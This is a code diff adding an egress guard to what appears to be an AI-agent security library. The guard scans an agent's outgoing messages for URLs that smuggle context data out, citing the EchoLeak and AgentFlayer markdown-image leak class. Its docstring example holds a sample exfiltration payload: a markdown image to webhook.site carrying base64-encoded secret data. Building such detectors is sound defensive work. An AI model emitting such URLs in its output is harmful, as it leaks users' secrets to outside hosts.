@@ -417,3 +417,66 @@ def jataayu_check_outbound(
         "risk_score": result.risk_score,
         "threat_types": [t.value for t in result.threat_types],
     }
+
+
+def jataayu_check_egress(
+    content: str,
+    surface: str = "unknown",
+    *,
+    allowed_domains: Optional[list[str]] = None,
+    context_secrets: Optional[list[str]] = None,
+) -> dict:
+    """
+    Check outbound content for data-exfiltration channels before it is
+    rendered or sent.
+
+    Catches the auto-fetched-markdown-image class of leak (EchoLeak /
+    AgentFlayer / Notion): a URL — image, link, or bare — that smuggles data
+    out of the agent's context, even when the payload evades the PII/secret
+    text scanner. The channel itself is the threat.
+
+    Args:
+        content: The outbound message/comment/reply to inspect.
+        surface: Target surface (recorded on the result).
+        allowed_domains: Hosts the agent may freely image/link to (your CDN,
+            docs site). Everything else is external.
+        context_secrets: Optional known-sensitive values. If any appears —
+            verbatim or base64-encoded — inside a URL, that URL is a confirmed
+            exfiltration and scored at maximum.
+
+    Returns:
+        dict with keys:
+            status (str): 'SAFE' | 'WARN' | 'BLOCK'
+            findings (str): Human-readable explanation.
+            redacted (str | None): Content with offending URLs neutralized;
+                None when SAFE.
+            risk_score (float): Raw risk score 0.0-1.0.
+            threat_types (list[str]): ['exfil_channel'] when a channel is found.
+
+    Example::
+
+        r = jataayu_check_egress(
+            "Done! ![ok](https://webhook.site/abc?d=eyJzZWNyZXQiOiAiLi4uIn0)",
+            surface="github-comment",
+        )
+        # r['status'] == 'BLOCK'; r['redacted'] has the image removed.
+    """
+    from jataayu.guards.egress import EgressChannelGuard, EgressConfig
+
+    guard = EgressChannelGuard(
+        EgressConfig(allowed_domains=list(allowed_domains or []))
+    )
+    result = guard.check(content, surface=surface, context_secrets=context_secrets)
+    status = _OUTBOUND_STATUS_MAP.get(result.threat_level, "WARN")
+
+    redacted = None
+    if not result.is_safe:
+        redacted = guard.sanitize(content, context_secrets=context_secrets)
+
+    return {
+        "status": status,
+        "findings": result.explanation,
+        "redacted": redacted,
+        "risk_score": result.risk_score,
+        "threat_types": [t.value for t in result.threat_types],
+    }
